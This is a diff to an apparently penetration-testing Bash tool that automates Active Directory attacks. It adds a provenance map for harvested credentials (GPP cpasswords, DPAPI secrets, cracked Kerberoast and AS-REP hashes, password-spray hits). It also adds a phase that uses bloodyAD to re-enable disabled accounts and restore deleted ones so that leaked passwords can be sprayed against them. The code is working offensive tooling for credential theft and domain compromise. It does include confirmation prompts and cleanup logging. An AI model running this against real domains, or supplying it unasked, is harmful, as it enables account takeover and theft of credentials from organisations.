@@ -221,13 +221,17 @@ queue_cred() {  # queue_cred <user> <password|""> <nthash|"">
     loot "New identity queued for pivoting → ${C_BOLD}${u}${C_RESET}$( [[ -n "$p" ]] && echo " (password)" || echo " (NT hash)")"
 }
 
-# Record any recovered plaintext password so it can be sprayed across all users
+# Record any recovered plaintext password (with its provenance) for spraying + the map
 add_secret() {
-    local p="$1"; [[ -z "$p" ]] && return
+    local p="$1" src="${2:-unknown source}"; [[ -z "$p" ]] && return
     [[ -n "${FOUND_SECRETS[$p]:-}" ]] && return
     FOUND_SECRETS["$p"]=1
     echo "$p" >>"$OUTDIR/found_passwords.txt"
+    printf '%-30s  ⟵  %s\n' "$p" "$src" >>"$OUTDIR/credential_map.txt"
 }
+
+# Record a confirmed/working identity and how it was obtained (for the final map)
+note_cred_source() { printf '%-28s  ⟵  %s\n' "$1" "$2" >>"$OUTDIR/valid_creds_map.txt"; }
 
 # ===========================================================================
 #  DEPENDENCY CHECK
@@ -582,6 +586,7 @@ phase_validate_creds() {
             export KRB5CCNAME="$tgt"; KERB_TICKET="$tgt"; HAVE_AUTH=1
             ok "TGT obtained → ${C_BOLD}credentials are valid${C_RESET}"
             loot "Reusable Kerberos ticket → KRB5CCNAME=$tgt"
+            note_cred_source "$USER" "authenticated (TGT obtained)"
         else
             warn "Could not obtain TGT (bad creds, clock skew, or wrong domain)"
         fi
@@ -815,7 +820,7 @@ phase_secrets() {
     run "$NXC smb $DCT ${args[*]} -M gpp_password"
     $NXC smb "$DCT" "${args[@]}" -M gpp_password 2>&1 | tee -a "$LOGFILE" | tee "$OUTDIR/gpp.txt"
     grep -oiP 'password:\s*\K\S+' "$OUTDIR/gpp.txt" 2>/dev/null | while read -r p; do
-        [[ -n "$p" ]] && { loot "GPP cpassword recovered: ${C_GREEN}$p${C_RESET}"; add_secret "$p"; }
+        [[ -n "$p" ]] && { loot "GPP cpassword recovered: ${C_GREEN}$p${C_RESET}"; add_secret "$p" "GPP cpassword (SYSVOL)"; }
     done
 
     subsection "gMSA — group Managed Service Account hashes"
@@ -1012,7 +1017,7 @@ phase_winrm_dpapi() {
         fi
         # Harvest any plaintext DPAPI recovered → feed the engine
         echo "$d" | grep -oiP '(password|secret)\s*:\s*\K\S+' | sort -u | while read -r p; do
-            [[ -n "$p" ]] && { loot "DPAPI secret recovered: ${C_GREEN}$p${C_RESET}"; add_secret "$p"; }
+            [[ -n "$p" ]] && { loot "DPAPI secret recovered: ${C_GREEN}$p${C_RESET}"; add_secret "$p" "DPAPI"; }
         done
         grep -qiE '\[CREDENTIAL\]|Saved' "$OUTDIR/dpapi.txt" 2>/dev/null && loot "DPAPI credential blobs decrypted → dpapi.txt"
     fi
@@ -1144,6 +1149,72 @@ _abuse_writespn() {
 }
 
 # ===========================================================================
+#  DELETED & DISABLED ACCOUNTS  —  detect, and (with --abuse) restore/enable
+#  Chain: restore a deleted user → re-enable it → a leaked password now works.
+# ===========================================================================
+phase_recycle_disabled() {
+    [[ "$HAVE_AUTH" != "1" || "$CAP_LDAP" != "1" ]] && return
+    have bloodyAD || return
+    section "DELETED & DISABLED ACCOUNTS"
+    local ba; mapfile -t ba < <(bloody_args)
+    local changed=0
+
+    subsection "Disabled accounts (re-enable + a known password = access)"
+    local dis
+    dis=$(bloodyAD "${ba[@]}" get search \
+            --filter '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))' \
+            --attr sAMAccountName 2>/dev/null | grep -oiP 'sAMAccountName:\s*\K\S+' | grep -viE '^(krbtgt|guest)$')
+    if [[ -n "$dis" ]]; then
+        echo "$dis" | while read -r u; do echo -e "      ${C_YELLOW}· $u (disabled)${C_RESET}"; done
+        echo "$dis" >"$OUTDIR/disabled_accounts.txt"
+        if [[ "$DO_ABUSE" == "1" ]]; then
+            echo "$dis" | while read -r u; do
+                confirm "  Re-enable disabled account '$u'?" || continue
+                if bloodyAD "${ba[@]}" remove uac "$u" -f ACCOUNTDISABLE 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|removed|modif'; then
+                    loot "★ Re-enabled '$u' → added to spray pool"
+                    rb_record "Re-enabled account $u" "bloodyAD ${ba[*]} add uac '$u' -f ACCOUNTDISABLE"
+                    echo "$u" >>"$OUTDIR/users_all.txt"; changed=1
+                fi
+            done
+        else
+            info "  (report-only; --abuse to re-enable and spray them)"
+        fi
+    else
+        info "No disabled user accounts found"
+    fi
+
+    subsection "Deleted objects (AD Recycle Bin)"
+    local del
+    del=$(bloodyAD "${ba[@]}" get search --filter '(isDeleted=TRUE)' \
+            --attr sAMAccountName,distinguishedName -c '1.2.840.113556.1.4.2065' 2>&1)
+    if echo "$del" | grep -qiE 'noSuchObject|denied|ERROR|Traceback'; then
+        info "Deleted objects not accessible with this identity (need rights / Recycle Bin)"
+    elif echo "$del" | grep -qi 'distinguishedName'; then
+        echo "$del" | grep -oiP 'distinguishedName:\s*\K.*DEL:[^,]+.*' | while read -r dn; do
+            echo -e "      ${C_MAGENTA}· $dn${C_RESET}"; done
+        echo "$del" >"$OUTDIR/deleted_objects.txt"
+        loot "Deleted objects present — restorable if you hold the rights"
+        if [[ "$DO_ABUSE" == "1" ]]; then
+            echo "$del" | grep -oiP 'distinguishedName:\s*\K\S.*' | grep -i 'DEL:' | while read -r dn; do
+                local name; name=$(echo "$dn" | grep -oiP '^CN=\K[^\\]+')
+                confirm "  Restore deleted object '$name'?" || continue
+                if bloodyAD "${ba[@]}" set restore "$dn" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'restored|success'; then
+                    loot "★ Restored '$name' — will re-enable & spray"
+                    rb_record "Restored deleted object $name" "echo 'Manual: re-delete $name if required by client'"
+                    [[ -n "$name" ]] && { echo "$name" >>"$OUTDIR/users_all.txt"
+                        bloodyAD "${ba[@]}" remove uac "$name" -f ACCOUNTDISABLE 2>&1 | tee -a "$LOGFILE" >/dev/null; }
+                fi
+            done
+        else
+            info "  (report-only; --abuse to restore them)"
+        fi
+    else
+        info "No deleted objects found"
+    fi
+    [[ "$changed" == "1" ]] && sort -u -o "$OUTDIR/users_all.txt" "$OUTDIR/users_all.txt"
+}
+
+# ===========================================================================
 #  CLEANUP  —  revert every change this tool made (responsible teardown)
 # ===========================================================================
 run_cleanup() {
@@ -1192,7 +1263,7 @@ crack_file() {
     if [[ -n "$pw" ]]; then
         loot "★ File password cracked → ${base} : ${C_GREEN}${C_BOLD}${pw}${C_RESET}"
         echo "${base}:${pw}" >>"$OUTDIR/cracked_files.txt"
-        add_secret "$pw"
+        add_secret "$pw" "doc password: $base"
         decrypt_and_read "$f" "$pw" "$ext"
     else
         info "Could not crack ${base} with this wordlist"
@@ -1246,7 +1317,7 @@ harvest_secrets() {
         [[ "$s" == */* || "$s" =~ \.(xml|bin|rels|png|jpg|csv|ini|inf|pol)$ ]] && continue
         if [[ -z "${FOUND_SECRETS[$s]:-}" ]]; then
             loot "Potential password harvested from ${label}: ${C_GREEN}${C_BOLD}$s${C_RESET}"
-            add_secret "$s"; added=$((added+1))
+            add_secret "$s" "harvested from $label"; added=$((added+1))
         fi
     done
     [[ "$added" == "0" ]] && info "No clear passwords harvested from ${label}"
@@ -1374,6 +1445,7 @@ _spray_one() {
     "$KERBRUTE_BIN" passwordspray -d "$DOMAIN" --dc "$DC_IP" "$OUTDIR/users_all.txt" "$pw" 2>&1 \
         | tee -a "$LOGFILE" | grep -i 'VALID LOGIN' | grep -oiP 'VALID LOGIN:\s+\K\S+?(?=@)' | while read -r u; do
             loot "★ Valid credential found by spray → ${C_GREEN}${u} : ${pw}${C_RESET}"
+            note_cred_source "${u}:${pw}" "password spray"
             queue_cred "$u" "$pw" ""
         done
 }
@@ -1465,7 +1537,7 @@ crack_hashes() {
         while IFS= read -r line; do
             local pw user
             pw="${line##*:}"
-            add_secret "$pw"
+            add_secret "$pw" "cracked $label hash"
             case "$label" in
                 AS-REP)     user=$(echo "$line" | grep -oP '\$krb5asrep\$[0-9]+\$\K[^@]+') ;;
                 Kerberoast) user=$(echo "$line" | grep -oP '\$krb5tgs\$[0-9]+\$\*\K[^$*]+') ;;
@@ -1497,6 +1569,20 @@ final_summary() {
     [[ -s "$OUTDIR/secretsdump.txt" ]]       && loot "NTLM hashes (DCSync):$(grep -cE ':::' "$OUTDIR/secretsdump.txt")"
     [[ -s "$OUTDIR/cracked_passwords.txt" ]] && loot "Cracked passwords:   $(wc -l <"$OUTDIR/cracked_passwords.txt")"
     grep -qiE 'ESC[0-9]+' "$OUTDIR/certipy_find.txt" 2>/dev/null && loot "Vulnerable ADCS:     YES (see certipy_find.txt)"
+
+    # Credential provenance map — where every secret/identity came from
+    if [[ -s "$OUTDIR/credential_map.txt" || -s "$OUTDIR/valid_creds_map.txt" ]]; then
+        subsection "Credential map (what we got & where it came from)"
+        if [[ -s "$OUTDIR/valid_creds_map.txt" ]]; then
+            echo -e "    ${C_BOLD}Working identities:${C_RESET}"
+            sort -u "$OUTDIR/valid_creds_map.txt" | while IFS= read -r l; do echo -e "      ${C_GREEN}$l${C_RESET}"; done
+        fi
+        if [[ -s "$OUTDIR/credential_map.txt" ]]; then
+            echo -e "    ${C_BOLD}Recovered passwords:${C_RESET}"
+            sort -u "$OUTDIR/credential_map.txt" | while IFS= read -r l; do echo -e "      ${C_MAGENTA}$l${C_RESET}"; done
+        fi
+        ok "Full map saved → credential_map.txt / valid_creds_map.txt"
+    fi
     echo
     ok "Done. Full log: $LOGFILE"
     echo -e "${C_GREY}    ════════════════════════════════════════════════════════════${C_RESET}"
@@ -1528,6 +1614,7 @@ assess_current_credential() {
     phase_secrets;      jitter
     phase_winrm_dpapi;  jitter
     phase_acl;          jitter
+    phase_recycle_disabled; jitter
     phase_relay;        jitter
     phase_trusts;       jitter
     phase_asreproast;   jitter
